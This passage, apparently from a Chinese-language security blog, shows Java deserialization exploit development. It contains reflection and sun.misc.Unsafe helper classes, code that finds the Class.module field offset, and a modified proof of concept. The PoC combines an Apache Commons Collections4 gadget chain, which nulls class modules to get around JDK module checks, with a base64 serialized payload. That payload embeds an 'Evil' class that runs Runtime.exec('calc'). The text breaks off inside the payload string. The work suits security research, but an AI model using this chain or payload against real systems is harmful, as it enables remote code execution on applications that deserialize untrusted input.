+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectUtil</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取对象的字段值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> getFieldValue(obj.getClass(), obj, name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取指定类的字段值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Class&lt;?&gt; clazz, Object obj, String name)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> clazz.getDeclaredField(name);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> f.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置对象的字段值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String name, Object val)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        UnsafeUtil.patchModule(ReflectUtil.class, obj.getClass());</span><br><span class="line">        setFieldValue(obj.getClass(), obj, name, val);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置指定类的字段值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Class&lt;?&gt; clazz, Object obj, String name, Object val)</span></span><br><span class="line">            <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> clazz.getDeclaredField(name);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, val);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用对象的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">invokeMethod</span><span class="params">(</span></span><br><span class="line"><span class="params">            Object obj, String name, Class&lt;?&gt;[] parameterTypes, Object[] args</span></span><br><span class="line"><span class="params">    )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> invokeMethod(obj.getClass(), obj, name, parameterTypes, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用指定类的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">invokeMethod</span><span class="params">(</span></span><br><span class="line"><span class="params">            Class&lt;?&gt; clazz, Object obj, String name, Class&lt;?&gt;[] parameterTypes, Object[] args</span></span><br><span class="line"><span class="params">    )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> clazz.getDeclaredMethod(name, parameterTypes);</span><br><span class="line">        m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> m.invoke(obj, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过构造函数创建对象实例</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newInstance</span><span class="params">(</span></span><br><span class="line"><span class="params">            Class&lt;?&gt; clazz, Class&lt;?&gt;[] parameterTypes, Object[] args</span></span><br><span class="line"><span class="params">    )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(parameterTypes);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> constructor.newInstance(args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnsafeUtil</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Unsafe unsafe;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; unsafeClass = Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">theUnsafeField</span> <span class="operator">=</span> unsafeClass.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">            theUnsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            unsafe = (Unsafe) theUnsafeField.get(<span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改类的 module 字段，使其属于 Object.class 的模块</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">patchModule</span><span class="params">(Class&lt;?&gt; clazz)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Module</span> <span class="variable">baseModule</span> <span class="operator">=</span> Object.class.getModule();</span><br><span class="line">        setFieldValue(clazz, <span class="string">&quot;module&quot;</span>, baseModule);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">patchModule</span><span class="params">(Class clazz, Class targetClass)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">UnsafeClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">unsafeField</span> <span class="operator">=</span> UnsafeClass.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">            unsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) unsafeField.get(<span class="literal">null</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">targetModule</span> <span class="operator">=</span> Class.class.getMethod(<span class="string">&quot;getModule&quot;</span>).invoke(targetClass);</span><br><span class="line">            <span class="type">long</span> <span class="variable">addr</span> <span class="operator">=</span> unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="string">&quot;module&quot;</span>));</span><br><span class="line">            unsafe.getAndSetObject(clazz, addr, targetModule);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取对象的字段值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> getFieldValue(obj.getClass(), obj, name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取指定类的字段值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Class&lt;?&gt; clazz, Object obj, String name)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> clazz.getDeclaredField(name);</span><br><span class="line">        <span class="type">long</span> offset;</span><br><span class="line">        <span class="keyword">if</span> (obj == <span class="literal">null</span>) &#123;</span><br><span class="line">            offset = unsafe.staticFieldOffset(f);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            offset = unsafe.objectFieldOffset(f);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> unsafe.getObject(obj, offset);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置对象的字段值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String name, Object val)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        setFieldValue(obj.getClass(), obj, name, val);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置指定类的字段值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Class&lt;?&gt; clazz, Object obj, String name, Object val)</span></span><br><span class="line">            <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> clazz.getDeclaredField(name);</span><br><span class="line">        <span class="type">long</span> offset;</span><br><span class="line">        <span class="keyword">if</span> (obj == <span class="literal">null</span>) &#123;</span><br><span class="line">            offset = unsafe.staticFieldOffset(f);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            offset = unsafe.objectFieldOffset(f);</span><br><span class="line">        &#125;</span><br><span class="line">        unsafe.putObject(obj, offset, val);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过 Unsafe 创建类实例（绕过构造函数）</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newInstance</span><span class="params">(Class&lt;?&gt; clazz)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> unsafe.allocateInstance(clazz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>前面我们在这一步时说第一个条件满足不了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756978697136-6fdc9ee8-f085-4b21-81cc-9c2158b3c464.png?x-oss-process=image/format,webp"
+                     
+                ></p>
+<p>因为我们没办法在反序列化的时候传一个 Module 类去 patch 我们自己的类（Evil）的 Module 让它等于 被反射的类（TrAXFilter）的 Module</p>
+<p>但是其实我们可以让他们两个的 Module 都为 null</p>
+<p>有了刚才的方法，我们可以调用两次 unsafe 去实现</p>
+<p>先找 module 的偏移：</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"><span class="keyword">import</span> java.lang.Class;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Offset</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">unsafeClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> unsafeClass.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) field.get(<span class="literal">null</span>);</span><br><span class="line"><span class="comment">//        long addr = unsafe.objectFieldOffset(Class.class.getDeclaredField(&quot;packageName&quot;));</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">addr</span> <span class="operator">=</span> unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="string">&quot;module&quot;</span>));</span><br><span class="line">        System.out.println(addr); <span class="comment">// packageName 60, module 48</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>调试刚才的 poc 可以看到 currentModule 所属的 class 对象是 InstantiateTransformer：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1757121382564-cd3a0a27-783c-41d5-9474-037f08762577.png"
+                     
+                ></p>
+<p>修改后的poc：</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.Class;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">//        Transformer[] transformers = new Transformer[]&#123;</span></span><br><span class="line"><span class="comment">//                new ConstantTransformer(</span></span><br><span class="line"><span class="comment">//                        sun.misc.Unsafe.class</span></span><br><span class="line"><span class="comment">//                ),</span></span><br><span class="line"><span class="comment">//                new InvokerTransformer(</span></span><br><span class="line"><span class="comment">//                        &quot;getDeclaredField&quot;,</span></span><br><span class="line"><span class="comment">//                        new Class[]&#123;String.class&#125;,</span></span><br><span class="line"><span class="comment">//                        new Object[]&#123;&quot;theUnsafe&quot;&#125;</span></span><br><span class="line"><span class="comment">//                ),</span></span><br><span class="line"><span class="comment">//                new ClosureTransformer(</span></span><br><span class="line"><span class="comment">//                        new TransformerClosure(</span></span><br><span class="line"><span class="comment">//                                new InvokerTransformer(</span></span><br><span class="line"><span class="comment">//                                        &quot;setAccessible&quot;,</span></span><br><span class="line"><span class="comment">//                                        new Class[]&#123;boolean.class&#125;,</span></span><br><span class="line"><span class="comment">//                                        new Object[]&#123;true&#125;</span></span><br><span class="line"><span class="comment">//                                )</span></span><br><span class="line"><span class="comment">//                        )</span></span><br><span class="line"><span class="comment">//                ),</span></span><br><span class="line"><span class="comment">//                new InvokerTransformer(</span></span><br><span class="line"><span class="comment">//                        &quot;get&quot;,</span></span><br><span class="line"><span class="comment">//                        new Class[]&#123;Object.class&#125;,</span></span><br><span class="line"><span class="comment">//                        new Object[]&#123;null&#125;</span></span><br><span class="line"><span class="comment">//                ),</span></span><br><span class="line"><span class="comment">//                new ClosureTransformer(</span></span><br><span class="line"><span class="comment">//                        new TransformerClosure(</span></span><br><span class="line"><span class="comment">//                                new InvokerTransformer(</span></span><br><span class="line"><span class="comment">//                                        &quot;getAndSetObject&quot;,</span></span><br><span class="line"><span class="comment">//                                        new Class[]&#123;Object.class, long.class, Object.class&#125;,</span></span><br><span class="line"><span class="comment">//                                        new Object[]&#123;Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;), 48, null&#125;</span></span><br><span class="line"><span class="comment">//                                )</span></span><br><span class="line"><span class="comment">//                        )</span></span><br><span class="line"><span class="comment">//                ),</span></span><br><span class="line"><span class="comment">//                new ClosureTransformer(</span></span><br><span class="line"><span class="comment">//                        new TransformerClosure(</span></span><br><span class="line"><span class="comment">//                                new InvokerTransformer(</span></span><br><span class="line"><span class="comment">//                                        &quot;getAndSetObject&quot;,</span></span><br><span class="line"><span class="comment">//                                        new Class[]&#123;Object.class, long.class, Object.class&#125;,</span></span><br><span class="line"><span class="comment">//                                        new Object[]&#123;Class.forName(&quot;org.apache.commons.collections4.functors.InstantiateTransformer&quot;), 48, null&#125;</span></span><br><span class="line"><span class="comment">//                                )</span></span><br><span class="line"><span class="comment">//                        )</span></span><br><span class="line"><span class="comment">//                ),</span></span><br><span class="line"><span class="comment">////                new InvokerTransformer(</span></span><br><span class="line"><span class="comment">////                        &quot;getAndSetObject&quot;,</span></span><br><span class="line"><span class="comment">////                        new Class[]&#123;Object.class, long.class, Object.class&#125;,</span></span><br><span class="line"><span class="comment">////                        new Object[]&#123;Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;), 60, &quot;org.xml.sax&quot;&#125;</span></span><br><span class="line"><span class="comment">////                ),</span></span><br><span class="line"><span class="comment">//                new ConstantTransformer(</span></span><br><span class="line"><span class="comment">//                        Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;)</span></span><br><span class="line"><span class="comment">//                ),</span></span><br><span class="line"><span class="comment">//                new InstantiateTransformer(</span></span><br><span class="line"><span class="comment">//                        new Class[]&#123;Templates.class&#125;,</span></span><br><span class="line"><span class="comment">//                        new Object[]&#123;TemplatesUtil.getTemplates()&#125;</span></span><br><span class="line"><span class="comment">//                )</span></span><br><span class="line"><span class="comment">//        &#125;;</span></span><br><span class="line"><span class="comment">//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span></span><br><span class="line"><span class="comment">//        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);</span></span><br><span class="line"><span class="comment">//        PriorityQueue priorityQueue = new PriorityQueue(2, transformingComparator);</span></span><br><span class="line"><span class="comment">//        ReflectUtil.setFieldValue(priorityQueue, &quot;size&quot;, 2);</span></span><br><span class="line"><span class="comment">//        System.out.println(SerializeUtil.serializeToBase64(priorityQueue));</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAuW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwdXIALltMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zNC5UcmFuc2Zvcm1lcjs5gTr7CNo/pQIAAHhwAAAACHNyADxvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnM0LmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAD3N1bi5taXNjLlVuc2FmZQAAAAAAAAAAAAAAeHBzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zNC5mdW5jdG9ycy5JbnZva2VyVHJhbnNmb3JtZXKH6P9re3zOOAIAA1sABWlBcmdzdAATW0xqYXZhL2xhbmcvT2JqZWN0O0wAC2lNZXRob2ROYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAF0AAl0aGVVbnNhZmV0ABBnZXREZWNsYXJlZEZpZWxkdXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAABdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuQ2xvc3VyZVRyYW5zZm9ybWVyBqPbHKGgbUYCAAFMAAhpQ2xvc3VyZXQAKUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L0Nsb3N1cmU7eHBzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zNC5mdW5jdG9ycy5UcmFuc2Zvcm1lckNsb3N1cmW3563DrldcVwIAAUwADGlUcmFuc2Zvcm1lcnEAfgAEeHBzcQB+ABJ1cQB+ABcAAAABc3IAEWphdmEubGFuZy5Cb29sZWFuzSBygNWc+u4CAAFaAAV2YWx1ZXhwAXQADXNldEFjY2Vzc2libGV1cQB+ABsAAAABdnIAB2Jvb2xlYW4AAAAAAAAAAAAAAHhwc3EAfgASdXEAfgAXAAAAAXB0AANnZXR1cQB+ABsAAAABdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwc3EAfgAfc3EAfgAic3EAfgASdXEAfgAXAAAAA3ZyADdjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UckFYRmlsdGVyAAAAAAAAAAAAAAB4cHNyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAwcHQAD2dldEFuZFNldE9iamVjdHVxAH4AGwAAAANxAH4AMXZyAARsb25nAAAAAAAAAAAAAAB4cHEAfgAxc3EAfgAfc3EAfgAic3EAfgASdXEAfgAXAAAAA3ZyAD9vcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnM0LmZ1bmN0b3JzLkluc3RhbnRpYXRlVHJhbnNmb3JtZXI0i/R/pIbQOwIAAlsABWlBcmdzcQB+ABNbAAtpUGFyYW1UeXBlc3EAfgAVeHBxAH4AOnBxAH4AO3VxAH4AGwAAAANxAH4AMXEAfgA+cQB+ADFzcQB+AA1xAH4AN3NxAH4AQ3VxAH4AFwAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAVTAAFX25hbWVxAH4AFEwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAAAAAAB1cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAJ1cgACW0Ks8xf4BghU4AIAAHhwAAABUsr+ur4AAAA3ABkBAARFdmlsBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAIAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwACgALCgAJAAwBAARjYWxjCAAOAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAEAARCgAJABIBAAY8aW5pdD4MABQABgoABAAVAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQAhAAIABAAAAAAAAgAIAAUABgABAAcAAAAWAAIAAAAAAAq4AA0SD7YAE1exAAAAAAABABQABgABAAcAAAARAAEAAQAAAAUqtwAWsQAAAAAAAQAXAAAAAgAYdXEAfgBPAAAAnsr+ur4AAAA3AAwBA